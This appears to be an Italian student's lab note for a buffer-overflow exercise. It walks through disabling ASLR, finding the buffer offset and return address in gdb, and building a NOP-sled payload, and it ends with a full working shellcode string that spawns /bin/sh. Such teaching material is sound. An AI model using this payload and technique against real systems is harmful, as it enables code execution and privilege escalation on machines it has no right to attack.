## Esercizio buffer overflow 11/06 

1. Prima di tutto disabilitare ASLR con
   echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
   
2. Lanciare gdb con argomento l'eseguibile e poi il comando 'run'

3. trovare N (dimensione del buffer) con 

3. run $(python -c "print('A'*N+'BBBB')") fin quando non restituisce 0x42424242 (si vede come l'indirizzo di ritorno risulti sovrascritto dalle B(42) inserite come    payload)
	
4. lanciare da un altro terminale python3 e lanciare len(<shellcode>), poi sottrarre la lunghezza della shellcode alla lunghezza del buffer = N2

5. come payload idealizziamo un "print('\x90'*N2+'<shellcode>'+<indirizzo-ritorno>')"

6. come troviamo l'indirizzo di ritorno? -> lanciamo info functions e notiamo che c'è una strcpy (o in caso anche gets) ad un indirizzo specifico (es. 0x56556030)

7. inseriamo un breakpoint a quell'indirizzo con 'br *<indirizzo>' (ps. copiaincollare)

8. runniamo il payload ideale con l'indirizzo e tutto, si fermerà al breakpoint
9. ora dobbiamo analizzare lo stack con 'x/<N>xw $esp' dove N è un numero variabile di indirizzi da stampare (andare a tentativi)
10. controlliamo tutti gli indirizzi fin quando non troviamo i nopsled (x90) e appena finiscono prendiamo quell'indirizzo li 
	ad esempio 0xffffd1bc, ma lo dobbiamo scrivere al contrario per little endian: 
		\xbc\xd1\xff\xff
11. quindi payload finale essere tipo: 
run $(python -c
"print('\x90'*576+'\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\xbc\xd1\xff\xff')")

12. se funziona, apre una shell!
